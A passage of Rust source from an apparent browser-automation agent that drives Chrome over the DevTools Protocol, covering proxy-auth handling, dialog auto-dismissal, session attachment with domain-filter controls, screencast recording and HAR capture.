        // Abort any existing handler.
        if let Some(task) = self.fetch_handler_task.take() {
            task.abort();
        }

        let Some(ref browser) = self.browser else {
            return;
        };

        let client = browser.client.clone();
        let mut rx = browser.client.subscribe_methods(&[
            "Fetch.authRequired",
            "Target.attachedToTarget",
            "Fetch.requestPaused",
        ]);
        let domain_filter = self.domain_filter.clone();
        let routes = self.routes.clone();
        let origin_headers = self.origin_headers.clone();
        let blocked_documents = self.blocked_documents.clone();
        let proxy_credentials = self.proxy_credentials.clone();
        let capture_session = self.recording_state.capture_session.clone();

        self.fetch_handler_task = Some(tokio::spawn(async move {
            loop {
                match rx.recv().await {
                    Some(event) if event.method == "Fetch.authRequired" => {
                        let request_id = event
                            .params
                            .get("requestId")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let sid = event.session_id.clone().unwrap_or_default();
                        let creds = proxy_credentials.read().await;
                        if let Some((ref user, ref pass)) = *creds {
                            let _ = client
                                .send_command(
                                    "Fetch.continueWithAuth",
                                    Some(json!({
                                        "requestId": request_id,
                                        "authChallengeResponse": {
                                            "response": "ProvideCredentials",
                                            "username": user,
                                            "password": pass,
                                        }
                                    })),
                                    Some(&sid),
                                )
                                .await;
                        } else {
                            let _ = client
                                .send_command(
                                    "Fetch.continueWithAuth",
                                    Some(json!({
                                        "requestId": request_id,
                                        "authChallengeResponse": {
                                            "response": "CancelAuth",
                                        }
                                    })),
                                    Some(&sid),
                                )
                                .await;
                        }
                    }
                    Some(event) if event.method == "Target.attachedToTarget" => {
                        let Some(sid) = event
                            .params
                            .get("sessionId")
                            .and_then(|v| v.as_str())
                            .map(ToString::to_string)
                        else {
                            continue;
                        };
                        let target_info = event.params.get("targetInfo").and_then(|value| {
                            serde_json::from_value::<TargetInfo>(value.clone()).ok()
                        });
                        // The recorder's screencast session shares a target
                        // with a page session that already carries the
                        // controls.
                        let is_recorder_session = target_info.as_ref().is_some_and(|target| {
                            recording::owns_attachment(&capture_session, &target.target_id, &sid)
                        });
                        if is_recorder_session {
                            continue;
                        }
                        let waiting_for_debugger = event
                            .params
                            .get("waitingForDebugger")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false);

                        let df = domain_filter.read().await.clone();
                        let has_proxy_creds = proxy_credentials.read().await.is_some();
                        setup_auto_attached_session(
                            &client,
                            &sid,
                            target_info.as_ref(),
                            waiting_for_debugger,
                            df.as_ref(),
                            has_proxy_creds,
                        )
                        .await;
                    }
                    Some(event) if event.method == "Fetch.requestPaused" => {
                        let request_id = event
                            .params
                            .get("requestId")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let request_url = event
                            .params
                            .get("request")
                            .and_then(|r| r.get("url"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let resource_type = event
                            .params
                            .get("resourceType")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let request_headers = event
                            .params
                            .get("request")
                            .and_then(|r| r.get("headers"))
                            .and_then(|h| h.as_object())
                            .cloned();
                        let frame_id = event
                            .params
                            .get("frameId")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let sid = event.session_id.clone().unwrap_or_default();

                        let paused = FetchPausedRequest {
                            request_id,
                            url: request_url,
                            resource_type,
                            frame_id,
                            session_id: sid,
                            request_headers,
                        };

                        let df = domain_filter.read().await;
                        let rt = routes.read().await;
                        let oh = origin_headers.read().await;

                        resolve_fetch_paused(
                            &client,
                            df.as_ref(),
                            &rt,
                            &oh,
                            &blocked_documents,
                            &paused,
                        )
                        .await;
                    }
                    Some(_) => continue,
                    None => break,
                }
            }
        }));
    }

    /// Start the background task that auto-accepts `alert` and `beforeunload`
    /// dialogs so they never block the agent. `confirm` and `prompt` dialogs
    /// are left for the agent to handle explicitly.
    fn start_dialog_handler(&mut self) {
        if let Some(task) = self.dialog_handler_task.take() {
            task.abort();
        }

        if !self.auto_dialog {
            return;
        }

        let Some(ref browser) = self.browser else {
            return;
        };

        let client = browser.client.clone();
        let mut rx = browser.client.subscribe();

        self.dialog_handler_task = Some(tokio::spawn(async move {
            loop {
                match rx.recv().await {
                    Ok(event) if event.method == "Page.javascriptDialogOpening" => {
                        let dialog_type = event
                            .params
                            .get("type")
                            .and_then(|v| v.as_str())
                            .unwrap_or("");
                        if matches!(dialog_type, "beforeunload" | "alert") {
                            let message = event
                                .params
                                .get("message")
                                .and_then(|v| v.as_str())
                                .unwrap_or("");
                            eprintln!("[auto-dismiss] {} dialog: {}", dialog_type, message);
                            let sid = event.session_id.clone().unwrap_or_default();
                            if let Err(e) = client
                                .send_command(
                                    "Page.handleJavaScriptDialog",
                                    Some(json!({ "accept": true })),
                                    Some(&sid),
                                )
                                .await
                            {
                                eprintln!(
                                    "[auto-dismiss] failed to dismiss {} dialog: {}",
                                    dialog_type, e
                                );
                            }
                        }
                    }
                    Ok(_) => continue,
                    Err(broadcast::error::RecvError::Lagged(_)) => continue,
                    Err(_) => break,
                }
            }
        }));
    }

    /// Update the stream server's CDP client slot when browser is set or cleared.
    pub async fn update_stream_client(&self) {
        if let Some(ref slot) = self.stream_client {
            let mut guard = slot.write().await;
            *guard = self.browser.as_ref().map(|m| Arc::clone(&m.client));
        }
        if let Some(ref server) = self.stream_server {
            // Update the CDP page session ID so screencast commands target the right page
            let session_id = self
                .browser
                .as_ref()
                .and_then(|m| m.active_session_id().ok().map(|s| s.to_string()));
            let connected = self.browser.is_some();
            let sc = server.is_screencasting().await;
            let (vw, vh) = server.viewport().await;
            if let Some(ref mgr) = self.browser {
                server
                    .bind_cdp_session_and_broadcast_tabs(session_id, &mgr.tab_list())
                    .await;
            } else {
                server
                    .bind_cdp_session_and_broadcast_tabs(session_id, &[])
                    .await;
            }
            server
                .broadcast_status(connected, sc, vw, vh, &self.engine)
                .await;
        }
    }

    /// Attach the recorder's own CDP session to the page behind `session_id`
    /// and spawn the task that screencasts into ffmpeg. The caller verifies
    /// ffmpeg before any navigation or restart teardown. Failures here roll the
    /// recording state back so the next `record start` is not blocked.
    async fn start_recording_task(
        &mut self,
        client: Arc<CdpClient>,
        session_id: String,
    ) -> Result<(), String> {
        let initial_frame = match recording::capture_initial_image(&client, &session_id).await {
            Ok(frame) => frame,
            Err(error) => {
                self.rollback_failed_recording_start().await;
                return Err(error);
            }
        };
        let capture_session = match recording::attach_capture_session(
            &client,
            &session_id,
            &self.recording_state.capture_session,
        )
        .await
        {
            Ok(capture_session) => capture_session,
            Err(e) => {
                self.rollback_failed_recording_start().await;
                return Err(e);
            }
        };
        let shared_count = Arc::new(AtomicU64::new(0));
        let shared_captured = Arc::new(AtomicU64::new(0));
        let shared_contact_sheet_count = Arc::new(AtomicU64::new(0));
        let shared_screenshot_capture = Arc::new(std::sync::atomic::AtomicBool::new(false));
        self.recording_state.device_scale = initial_frame.device_scale;
        let (cancel_tx, cancel_rx) = oneshot::channel();
        if self.recording_state.cursor {
            self.refresh_active_iframe_sessions().await;
            let mut sessions: Vec<_> = self.active_iframe_sessions.iter().cloned().collect();
            sessions.push(capture_session.clone());
            if let Err(error) = recording::ensure_cursor_overlays(
                &client,
                &self.recording_state.cursor_overlays,
                &sessions,
            )
            .await
            {
                recording::remove_cursor_overlays(&client, &self.recording_state.cursor_overlays)
                    .await;
                recording::detach_capture_session(&client, &capture_session).await;
                self.rollback_failed_recording_start().await;
                return Err(format!("Failed to install recording cursor: {error}"));
            }
        }
        let handle = recording::spawn_recording_task(
            client,
            capture_session,
            session_id,
            initial_frame,
            self.recording_state.output_path.clone(),
            self.recording_state.fps,
            shared_count.clone(),
            shared_captured.clone(),
            self.recording_state.cursor,
            self.recording_state.shared_cursor.clone(),
            self.recording_state.cursor_overlays.clone(),
            self.active_iframe_sessions.iter().cloned().collect(),
            self.recording_state.contact_sheet_path.clone(),
            self.recording_state.contact_sheet_threshold,
            shared_contact_sheet_count.clone(),
            shared_screenshot_capture.clone(),
            cancel_rx,
        );
        self.recording_state.capture_task = Some(handle);
        self.recording_state.shared_frame_count = Some(shared_count);
        self.recording_state.shared_captured_count = Some(shared_captured);
        self.recording_state.shared_contact_sheet_count = Some(shared_contact_sheet_count);
        self.recording_state.shared_screenshot_capture = Some(shared_screenshot_capture);
        self.recording_state.cancel_tx = Some(cancel_tx);
        Ok(())
    }

    /// Reconcile every externally visible recording flag after startup fails.
    async fn rollback_failed_recording_start(&mut self) {
        self.recording_state.active = false;
        if let Some(ref server) = self.stream_server {
            server.set_recording(false, &self.engine).await;
        }
    }

    async fn stop_recording_task(&mut self) -> Result<(), String> {
        recording::stop_recording_task(&mut self.recording_state).await
    }

    pub async fn drain_cdp_events_background(&mut self) -> Result<(), String> {
        let drained = self.drain_cdp_events();
        self.apply_drained_events(drained).await
    }

    async fn refresh_active_iframe_sessions(&mut self) {
        let Some(ref browser) = self.browser else {
            self.active_iframe_sessions.clear();
            return;
        };
        let Ok(top_session_id) = browser.active_session_id().map(ToString::to_string) else {
            self.active_iframe_sessions.clear();
            return;
        };
        if self.iframe_sessions.is_empty() {
            self.active_iframe_sessions.clear();
            return;
        }

        let client = browser.client.clone();
        let iframe_sessions = self.iframe_sessions.clone();
        self.active_iframe_sessions =
            a11y::active_iframe_session_ids(&client, &top_session_id, &iframe_sessions)
                .await
                .unwrap_or_default();
    }

    async fn apply_drained_events(&mut self, drained: DrainedEvents) -> Result<(), String> {
        // Popups and externally closed pages can change the active top-level
        // target without changing iframe topology. Refresh after either kind
        // of event so network capture stays scoped to the active page.
        let active_frame_scope_changed = active_frame_scope_may_have_changed(&drained);
        // ACK screencast frames
        if !drained.pending_acks.is_empty() {
            if let Some(ref browser) = self.browser {
                if let Ok(session_id) = browser.active_session_id() {
                    for ack_sid in drained.pending_acks {
                        let _ = stream::ack_screencast_frame(&browser.client, session_id, ack_sid)
                            .await;
                    }
                }
            }
        }

        // Remove destroyed targets
        for target_id in &drained.destroyed_targets {
            if let Some(ref mut mgr) = self.browser {
                mgr.remove_page_by_target_id(target_id);
            }
        }

        // Track cross-origin iframe sessions
        for (frame_id, iframe_sid) in &drained.attached_iframe_sessions {
            self.iframe_sessions
                .insert(frame_id.clone(), iframe_sid.clone());
            let filter = self.domain_filter.read().await.clone();
            let has_proxy_creds = self.proxy_credentials.read().await.is_some();
            let controls_active = filter.is_some() || has_proxy_creds;
            let setup_result = if let Some(ref mgr) = self.browser {
                bounded_auto_attached_setup("session", iframe_sid, async {
                    mgr.prepare_domains_pub(iframe_sid).await?;
                    let _ = mgr
                        .client
                        .send_command_no_params("DOM.enable", Some(iframe_sid.as_str()))
                        .await;
                    let _ = mgr
                        .client
                        .send_command_no_params("Accessibility.enable", Some(iframe_sid.as_str()))
                        .await;
                    if controls_active {
                        install_network_controls_for_session(
                            &mgr.client,
                            iframe_sid,
                            filter.as_ref(),
                            has_proxy_creds,
                            false,
                        )
                        .await?;
                    }
                    mgr.resume_if_waiting_pub(iframe_sid).await
                })
                .await
            } else {
                Ok(())
            };
            match setup_result {
                Ok(()) => {}
                // Only this session is dropped; other frames keep theirs.
                Err(error) if is_session_detached_error(&error) => {
                    log_detached_during_setup("iframe", &error);
                    self.iframe_sessions.retain(|_, sid| sid != iframe_sid);
                    self.active_iframe_sessions.remove(iframe_sid);
                }
                Err(error) if controls_active => {
                    return close_after_network_control_failure(self, error).await;
                }
                Err(error) => {
                    eprintln!(
                        "Warning: failed to prepare iframe session controls: {}",
                        error
                    );
                    // No controls depend on the pause, so do not leave the
                    // frame stopped before its first script.
                    if let Some(ref mgr) = self.browser {
                        let _ = mgr.resume_if_waiting_pub(iframe_sid).await;
                    }
                }
            }
        }

        // Register top-level pages that browser-level auto-attach paused before
        // their first request. Controls must be installed before resuming.
        for (target_info, page_sid) in &drained.attached_page_sessions {
            let filter = self.domain_filter.read().await.clone();
            let has_proxy_creds = self.proxy_credentials.read().await.is_some();
            let controls_active = filter.is_some() || has_proxy_creds;
            let setup_result = if let Some(ref mut mgr) = self.browser {
                bounded_auto_attached_setup("session", page_sid, async {
                    mgr.prepare_domains_pub(page_sid).await?;
                    if controls_active {
                        install_network_controls_for_session(
                            &mgr.client,
                            page_sid,
                            filter.as_ref(),
                            has_proxy_creds,
                            false,
                        )
                        .await?;
                    }

                    let mut page_url = target_info.url.clone();
                    if let Some(ref filter) = filter {
                        if should_blank_existing_url(&page_url, filter) {
                            let _ = mgr
                                .client
                                .send_command(
                                    "Page.navigate",
                                    Some(json!({ "url": "about:blank" })),
                                    Some(page_sid),
                                )
                                .await;
                            page_url = "about:blank".to_string();
                        }
                    }

                    // This handler drains `Target.attachedToTarget` for a
                    // page that browser-level auto-attach discovered before
                    // its own `Target.targetCreated` was drained (e.g. a
                    // human-opened tab, or a JS-opened popup in the shared
                    // Chrome). Explicit agent commands (`tab new`, `window
                    // new`, `click --new-tab`) already register their own
                    // page via `add_page` on their own path before this
                    // event is ever drained, so this branch never runs for
                    // agent-initiated tabs. `register_discovered_page` is the
                    // single decision point shared with the
                    // `Target.targetCreated` handler below: a pinned session
                    // never activates a discovered target (that would steal
                    // the active tab and overwrite its binding); a legacy
                    // session follows it.
                    mgr.register_discovered_page(
                        &target_info.target_id,
                        page_sid,
                        page_url,
                        target_info.title.clone(),
                        target_info.target_type.clone(),
                    );

                    mgr.resume_if_waiting_pub(page_sid).await
                })
                .await
            } else {
                Ok(())
            };
            match setup_result {
                Ok(()) => {}
                // A popup that closed right away; its target is gone.
                Err(error) if is_session_detached_error(&error) => {
                    log_detached_during_setup("page", &error);
                }
                Err(error) if controls_active => {
                    return close_after_network_control_failure(self, error).await;
                }
                Err(error) => {
                    eprintln!(
                        "Warning: failed to prepare attached page session: {}",
                        error
                    );
                }
            }
        }

        for (target_info, worker_sid) in &drained.attached_worker_sessions {
            let filter = self.domain_filter.read().await.clone();
            let has_proxy_creds = self.proxy_credentials.read().await.is_some();
            let controls_active = filter.is_some() || has_proxy_creds;
            let setup_result = if let Some(ref mgr) = self.browser {
                bounded_auto_attached_setup("session", worker_sid, async {
                    prepare_network_control_target_session(&mgr.client, worker_sid, target_info)
                        .await?;
                    if controls_active {
                        install_worker_network_controls_for_session(
                            &mgr.client,
                            worker_sid,
                            filter.as_ref(),
                            has_proxy_creds,
                            target_info,
                        )
                        .await?;
                    }
                    let _ = mgr
                        .client
                        .send_command_no_wait(
                            "Runtime.runIfWaitingForDebugger",
                            None,
                            Some(worker_sid),
                        )
                        .await;
                    Ok(())
                })
                .await
            } else {
                Ok(())
            };
            match setup_result {
                Ok(()) => {}
                Err(error) if is_session_detached_error(&error) => {
                    log_detached_during_setup("worker", &error);
                }
                Err(error) if controls_active => {
                    return close_after_network_control_failure(self, error).await;
                }
                Err(error) => {
                    eprintln!(
                        "Warning: failed to prepare worker session controls: {}",
                        error
                    );
                }
            }
        }

        for sid in &drained.attached_other_sessions {
            if let Some(ref mgr) = self.browser {
                let _ = mgr.resume_if_waiting_pub(sid).await;
            }
        }

        for sid in &drained.detached_iframe_sessions {
            self.iframe_sessions.retain(|_, v| v != sid);
            self.active_iframe_sessions.remove(sid);
        }

        // Attach and register new targets
        for te in &drained.new_targets {
            let filter = self.domain_filter.read().await.clone();
            let has_proxy_creds = self.proxy_credentials.read().await.is_some();
            let controls_active = filter.is_some() || has_proxy_creds;
            let setup_result = if let Some(ref mut mgr) = self.browser {
                let target_id = te.target_info.target_id.as_str();
                bounded_auto_attached_setup("target", target_id, async {
                    let attach: AttachToTargetResult = mgr
                        .client
                        .send_command_typed(
                            "Target.attachToTarget",
                            &AttachToTargetParams {
                                target_id: te.target_info.target_id.clone(),
                                flatten: true,
                            },
                            None,
                        )
                        .await?;
                    mgr.prepare_domains_pub(&attach.session_id).await?;
                    if controls_active {
                        install_network_controls_for_session(
                            &mgr.client,
                            &attach.session_id,
                            filter.as_ref(),
                            has_proxy_creds,
                            false,
                        )
                        .await?;
                    }

                    let mut page_url = te.target_info.url.clone();
                    if let Some(ref filter) = filter {
                        if should_blank_existing_url(&page_url, filter) {
                            let _ = mgr
                                .client
                                .send_command(
                                    "Page.navigate",
                                    Some(json!({ "url": "about:blank" })),
                                    Some(&attach.session_id),
                                )
                                .await;
                            page_url = "about:blank".to_string();
                        }
                    }

                    // Event-discovered target (e.g. a tab the human opened in the
                    // shared Chrome, or a JS-opened popup): register it via the
                    // same `register_discovered_page` decision point used by the
                    // `Target.attachedToTarget` handler above, which activates it
                    // only for legacy sessions; a pinned session never adopts a
                    // discovered tab (that steal would also overwrite its
                    // binding). Explicit commands (`tab new`, `window new`,
                    // `click --new-tab`) activate via their own paths.
                    mgr.register_discovered_page(
                        &te.target_info.target_id,
                        &attach.session_id,
                        page_url,
                        te.target_info.title.clone(),
                        te.target_info.target_type.clone(),
                    );
                    mgr.resume_if_waiting_pub(&attach.session_id).await
                })
                .await
            } else {
                Ok(())
            };
            match setup_result {
                Ok(()) => {}
                Err(error) if is_session_detached_error(&error) => {
                    log_detached_during_setup("page", &error);
                }
                Err(error) if controls_active => {
                    return close_after_network_control_failure(self, error).await;
                }
                Err(error) => {
                    eprintln!("Warning: failed to prepare new page session: {}", error);
                }
            }
        }

        // Update changed targets
        for te in &drained.changed_targets {
            if let Some(ref mut mgr) = self.browser {
                mgr.update_page_target_info(&te.target_info);
            }
        }

        // Fetch response bodies for HAR entries that just finished loading,
        // while Chrome still has them buffered — bodies are evicted on
        // navigation, so this cannot wait until `har stop`.
        if self.har_recording && !drained.har_finished_requests.is_empty() {
            let mode = self.har_content_mode;
            let mut to_fetch: Vec<(String, Option<String>)> = Vec::new();
            for (request_id, session_id) in &drained.har_finished_requests {
                let Some(entry) = self
                    .har_entries
                    .iter()
                    .rev()
                    .find(|e| &e.request_id == request_id)
                else {
                    continue;
                };
                if entry.response_body.is_some() {
                    continue;
                }
                let wanted = match mode {
                    HarContentMode::None => false,
                    HarContentMode::Text => har_mime_is_text(&entry.mime_type),
                    HarContentMode::All => true,
                };
                if wanted {
                    to_fetch.push((request_id.clone(), session_id.clone()));
                }
            }

            let mut fetched: Vec<(String, String, bool)> = Vec::new();
            if let Some(ref mgr) = self.browser {
                let active_sid = mgr.active_session_id().ok().map(String::from);
                for (request_id, event_sid) in to_fetch {
                    let Some(sid) = event_sid.or_else(|| active_sid.clone()) else {
                        continue;
                    };
                    let Ok(result) = mgr
                        .client
                        .send_command(
                            "Network.getResponseBody",
                            Some(json!({ "requestId": &request_id })),
                            Some(&sid),
                        )
                        .await
                    else {
                        continue;
                    };
                    let base64_encoded = result
                        .get("base64Encoded")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false);
                    if let Some(body) = result.get("body").and_then(|v| v.as_str()) {
                        if !body.is_empty()
                            && body.len() <= HAR_MAX_BODY_BYTES
                            && self.har_body_total_bytes + body.len() <= HAR_MAX_TOTAL_BODY_BYTES
                        {
                            self.har_body_total_bytes += body.len();
                            fetched.push((request_id, body.to_string(), base64_encoded));
                        }
                    }
                }
            }

            for (request_id, body, base64_encoded) in fetched {
                if let Some(entry) = self
                    .har_entries
                    .iter_mut()
                    .rev()
                    .find(|e| e.request_id == request_id)
                {
                    entry.response_body = Some(body);
                    entry.response_body_base64 = base64_encoded;
                }
            }
        }

        if active_frame_scope_changed {
            self.refresh_active_iframe_sessions().await;
            if self.recording_state.active && self.recording_state.cursor {
                let capture = self
                    .recording_state
                    .capture_session
                    .lock()
                    .ok()
                    .and_then(|capture| capture.as_ref().and_then(|c| c.session_id.clone()));
                if let (Some(browser), Some(capture)) = (self.browser.as_ref(), capture) {
                    if let Ok(sessions) = a11y::active_iframe_session_ids(
                        &browser.client,
                        &capture,
                        &self.iframe_sessions,
                    )
                    .await
                    {
                        let _ = recording::ensure_cursor_overlays(
                            &browser.client,
                            &self.recording_state.cursor_overlays,
                            &sessions.into_iter().collect::<Vec<_>>(),
                        )
                        .await;
                    }
                }
            }
        }

        Ok(())
    }

    fn drain_cdp_events(&mut self) -> DrainedEvents {
        let rx = match self.event_rx.as_mut() {
            Some(rx) => rx,
            None => return DrainedEvents::default(),
        };

        let mut pending_acks: Vec<i64> = Vec::new();
        let mut new_targets: Vec<TargetCreatedEvent> = Vec::new();
        let mut new_target_ids: HashSet<String> = HashSet::new();
        let mut changed_targets: Vec<TargetInfoChangedEvent> = Vec::new();
        let mut destroyed_targets: Vec<String> = Vec::new();
        let mut attached_page_sessions: Vec<(TargetInfo, String)> = Vec::new();
        let mut attached_iframe_sessions: Vec<(String, String)> = Vec::new();
        let mut attached_worker_sessions: Vec<(TargetInfo, String)> = Vec::new();
        let mut attached_other_sessions: Vec<String> = Vec::new();
        let mut detached_iframe_sessions: Vec<String> = Vec::new();
        let mut har_finished_requests: Vec<(String, Option<String>)> = Vec::new();

        loop {
            match rx.try_recv() {
                Ok(event) => {
                    if self.downloads.observe(&event.method, &event.params) {
                        continue;
                    }
                    // Target events are not session-scoped; handle them first
                    match event.method.as_str() {
                        "Target.targetCreated" => {
                            if let Ok(te) =
                                serde_json::from_value::<TargetCreatedEvent>(event.params.clone())
                            {
                                if should_track_target(&te.target_info) {
                                    let already_tracked = self
                                        .browser
                                        .as_ref()
                                        .is_none_or(|b| b.has_target(&te.target_info.target_id));
                                    if !already_tracked {
                                        new_target_ids.insert(te.target_info.target_id.clone());
                                        new_targets.push(te);
                                    }
                                }
                            }
                            continue;
                        }
                        "Target.targetInfoChanged" => {
                            if let Ok(te) = serde_json::from_value::<TargetInfoChangedEvent>(
                                event.params.clone(),
                            ) {
                                if should_track_target(&te.target_info) {
                                    // If this target is not yet tracked (e.g. it was
                                    // initially filtered because its URL was
                                    // chrome://newtab/), promote it to a new target
                                    // so it gets attached and added to `pages`.
                                    let already_tracked = self
                                        .browser
                                        .as_ref()
                                        .is_some_and(|b| b.has_target(&te.target_info.target_id));
                                    if already_tracked
                                        || new_target_ids.contains(&te.target_info.target_id)
                                    {
                                        changed_targets.push(te);
                                    } else {
                                        new_target_ids.insert(te.target_info.target_id.clone());
                                        new_targets.push(TargetCreatedEvent {
                                            target_info: te.target_info,
                                        });
                                    }
                                }
                            }
                            continue;
                        }
                        "Target.targetDestroyed" => {
                            if let Ok(te) =
                                serde_json::from_value::<TargetDestroyedEvent>(event.params.clone())
                            {
                                let destroyed_active_target = self
                                    .browser
                                    .as_ref()
                                    .and_then(|browser| browser.active_target_id().ok())
                                    == Some(te.target_id.as_str());
                                if let Some(session_id) = self
                                    .browser
                                    .as_ref()
                                    .and_then(|browser| {
                                        browser.session_id_for_target(&te.target_id)
                                    })
                                    .map(ToString::to_string)
                                {
                                    if destroyed_active_target {
                                        self.webmcp.clear_page_scope(&session_id);
                                    } else {
                                        self.webmcp.clear_page_tools(&session_id);
                                    }
                                }
                                if let Some(session) = self.browser.as_ref().and_then(|browser| {
                                    browser.session_id_for_target(&te.target_id)
                                }) {
                                    self.webmcp.observations.remove(session);
                                }
                                new_targets
                                    .retain(|entry| entry.target_info.target_id != te.target_id);
                                new_target_ids.remove(&te.target_id);
                                attached_page_sessions.retain(|(target_info, _)| {
                                    target_info.target_id != te.target_id
                                });
                                attached_worker_sessions.retain(|(target_info, _)| {
                                    target_info.target_id != te.target_id
                                });
                                attached_iframe_sessions
                                    .retain(|(target_id, _)| target_id != &te.target_id);
                                destroyed_targets.push(te.target_id);
                            }
                            continue;
                        }
                        "Target.attachedToTarget" => {
                            if let (Some(sid), Some(target_info_value)) = (
                                event.params.get("sessionId").and_then(|v| v.as_str()),
                                event.params.get("targetInfo"),
                            ) {
                                match serde_json::from_value::<TargetInfo>(
                                    target_info_value.clone(),
                                ) {
                                    // The recorder's screencast session is
                                    // not a tab and must not have page
                                    // domains enabled on it.
                                    Ok(target_info)
                                        if recording::owns_attachment(
                                            &self.recording_state.capture_session,
                                            &target_info.target_id,
                                            sid,
                                        ) => {}
                                    Ok(target_info) if target_info.target_type == "iframe" => {
                                        // For OOPIF targets, Chrome uses the frameId as
                                        // the targetId, so we can key iframe_sessions by it.
                                        attached_iframe_sessions
                                            .push((target_info.target_id, sid.to_string()));
                                    }
                                    Ok(target_info) if should_track_target(&target_info) => {
                                        attached_page_sessions.push((target_info, sid.to_string()));
                                    }
                                    Ok(target_info) if target_is_worker_like(&target_info) => {
                                        attached_worker_sessions
                                            .push((target_info, sid.to_string()));
                                    }
                                    _ => {
                                        attached_other_sessions.push(sid.to_string());
                                    }
                                }
                            }
                            continue;
                        }
                        "Target.detachedFromTarget" => {
                            if let Some(sid) =
                                event.params.get("sessionId").and_then(|v| v.as_str())
                            {
                                if let Some(frame_id) =
                                    self.iframe_sessions
                                        .iter()
                                        .find_map(|(frame_id, known_sid)| {
                                            (known_sid == sid).then(|| frame_id.clone())
                                        })
                                {
                                    if let Some(ref browser) = self.browser {
                                        if let Ok(session_id) = browser.active_session_id() {
                                            self.webmcp.clear_frame_scope(session_id, &frame_id);
                                        }
                                    }
                                }
                                attached_page_sessions.retain(|(_, known_sid)| known_sid != sid);
                                attached_worker_sessions.retain(|(_, known_sid)| known_sid != sid);
                                attached_iframe_sessions.retain(|(_, known_sid)| known_sid != sid);
                                attached_other_sessions.retain(|known_sid| known_sid != sid);
                                detached_iframe_sessions.push(sid.to_string());
                            }
                            continue;
                        }
                        _ => {}
                    }

                    let session_matches = if let Some(ref browser) = self.browser {
                        event.session_id.as_deref() == browser.active_session_id().ok()
                    } else {
                        false
                    };

                    // Allow Network events from cross-origin iframe sessions
                    // when HAR recording or request tracking is active.
                    let iframe_network_event = !session_matches
                        && is_active_iframe_network_event(
                            &event.method,
                            event.session_id.as_deref(),
                            self.har_recording || self.request_tracking,
                            &self.active_iframe_sessions,
                        );

                    let webmcp_event = event.session_id.as_deref().is_some_and(|sid| {
                        (matches!(
                            event.method.as_str(),
                            "WebMCP.toolsAdded"
                                | "WebMCP.toolsRemoved"
                                | "Page.frameNavigated"
                                | "Page.frameDetached"
                        ) && self
                            .browser
                            .as_ref()
                            .is_some_and(|browser| browser.has_page_session(sid)))
                            || (event.method == "WebMCP.toolResponded"
                                && (session_matches
                                    || self.active_iframe_sessions.contains(sid)
                                    || self.iframe_sessions.values().any(|known| known == sid)))
                    });

                    if !session_matches && !iframe_network_event && !webmcp_event {
                        continue;
                    }

                    match event.method.as_str() {
                        "WebMCP.toolsAdded" => {
                            if let Some(session_id) = event.session_id.as_deref() {
                                self.webmcp
                                    .apply_tools_added(session_id, &event.params, "null");
                            }
                        }
                        "WebMCP.toolsRemoved" => {
                            if let Some(session_id) = event.session_id.as_deref() {
                                self.webmcp.apply_tools_removed(session_id, &event.params);
                            }
                        }
                        "WebMCP.toolResponded" => {
                            self.webmcp.apply_response(event.params.clone());
                        }
                        "Page.frameNavigated" => {
                            if let Some(frame) = event.params.get("frame") {
                                let session_id = event.session_id.as_deref().unwrap_or_default();
                                if frame.get("parentId").is_none() {
                                    if session_matches {
                                        self.webmcp.clear_page_scope(session_id);
                                    } else {
                                        self.webmcp.clear_page_tools(session_id);
                                    }
                                }
                                if let (Some(frame_id), Some(origin)) = (
                                    frame.get("id").and_then(Value::as_str),
                                    webmcp::frame_origin(frame),
                                ) {
                                    self.webmcp
                                        .update_frame_origin(session_id, frame_id, &origin);
                                }
                            }
                        }
                        "Page.frameDetached" => {
                            if let Some(frame_id) =
                                event.params.get("frameId").and_then(Value::as_str)
                            {
                                let session_id = event.session_id.as_deref().unwrap_or_default();
                                self.webmcp.clear_frame_scope(session_id, frame_id);
                            }
                        }
                        "Runtime.consoleAPICalled" => {
                            let level = event
                                .params
                                .get("type")
                                .and_then(|v| v.as_str())
                                .unwrap_or("log");
                            let raw_args: Vec<Value> = event
                                .params
                                .get("args")
                                .and_then(|v| v.as_array())
                                .cloned()
                                .unwrap_or_default();
                            let text = network::format_console_args(&raw_args);
                            if let Some(ref server) = self.stream_server {
                                server.broadcast_console(level, &text, &raw_args);
                            }
                            self.event_tracker.add_console(level, &text, raw_args);
                        }
                        "Runtime.exceptionThrown" => {
                            if let Ok(ex_event) =
                                serde_json::from_value::<ExceptionThrownEvent>(event.params.clone())
                            {
                                let details = &ex_event.exception_details;
                                let text = details
                                    .exception
                                    .as_ref()
                                    .and_then(|e| e.description.as_deref())
                                    .unwrap_or(&details.text);
                                self.event_tracker.add_error(
                                    text,
                                    None,
                                    details.line_number,
                                    details.column_number,
                                );
                                if let Some(ref server) = self.stream_server {
                                    server.broadcast_page_error(
                                        text,
                                        details.line_number,
                                        details.column_number,
                                    );
                                }
                            }
                        }
                        "Network.requestWillBeSent"
                            if self.har_recording || self.request_tracking =>
                        {
                            if let Some(request) = event.params.get("request") {
                                let method = request
                                    .get("method")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("GET")
                                    .to_string();
                                let url = request
                                    .get("url")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("")
                                    .to_string();
                                let request_id = event
                                    .params
                                    .get("requestId")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("")
                                    .to_string();
                                if self.har_recording {
                                    let wall_time = event
                                        .params
                                        .get("wallTime")
                                        .and_then(|v| v.as_f64())
                                        .unwrap_or(0.0);
                                    let request_headers =
                                        har_extract_headers(request.get("headers"));
                                    let post_data = request
                                        .get("postData")
                                        .and_then(|v| v.as_str())
                                        .map(String::from);
                                    let request_body_size =
                                        post_data.as_ref().map(|s| s.len() as i64).unwrap_or(0);
                                    let resource_type = event
                                        .params
                                        .get("type")
                                        .and_then(|v| v.as_str())
                                        .unwrap_or("Other")
                                        .to_string();
                                    // A redirect re-sends this request id; the hop it
                                    // answers ends here, with the redirect response.
                                    if let Some(redirect) = event.params.get("redirectResponse") {
                                        if let Some(prev) = self
                                            .har_entries
                                            .iter_mut()
                                            .rev()
                                            .find(|e| e.request_id == request_id)
                                        {
                                            har_fill_response(prev, redirect);
